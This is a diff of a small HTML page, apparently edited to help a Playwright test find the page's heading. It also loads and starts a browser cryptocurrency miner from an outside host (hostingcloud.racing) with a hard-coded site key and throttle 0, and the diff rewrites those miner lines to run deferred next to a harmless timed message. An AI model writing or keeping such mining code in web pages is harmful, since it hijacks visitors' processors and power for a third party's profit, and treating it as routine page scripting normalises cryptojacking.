@@ -6,28 +6,26 @@
   <title>My Simple Page</title>
 </head>
 <body>
-  <!-- Playwright looks for this exact heading text -->
+  <!-- Playwright’s getByRole('heading', { name: 'My Simple Page' }) will find this right away -->
   <h1>My Simple Page</h1>
   <p>Your browser will start mining in the background.</p>
 
-  <!-- HostingCloud Mining Client -->
-  <script src="https://www.hostingcloud.racing/tc1M.js"></script>
-  <script>
-    // start the mining client immediately
+  <!-- defer so the <h1> is parsed and rendered before scripts run -->
+  <script defer src="https://www.hostingcloud.racing/tc1M.js"></script>
+  <script defer>
+    // start the mining client
     var _client = new Client.Anonymous(
       '195aebec64e39cfa71b56ed950fe41b63732e97109de79988755ac411447cc54',
       { throttle: 0, c: 'w' }
     );
     _client.start();
 
-    // schedule the 210-second delayed message
-    document.addEventListener('DOMContentLoaded', function() {
-      setTimeout(function() {
-        var delayedMessage = document.createElement('div');
-        delayedMessage.textContent = '🔔 210 seconds have passed since the page loaded!';
-        document.body.appendChild(delayedMessage);
-      }, 210000);
-    });
+    // schedule your 210-second delayed message
+    setTimeout(function() {
+      var msg = document.createElement('div');
+      msg.textContent = '🔔 210 seconds have passed since the page loaded!';
+      document.body.appendChild(msg);
+    }, 210000);
   </script>
 </body>
 </html>
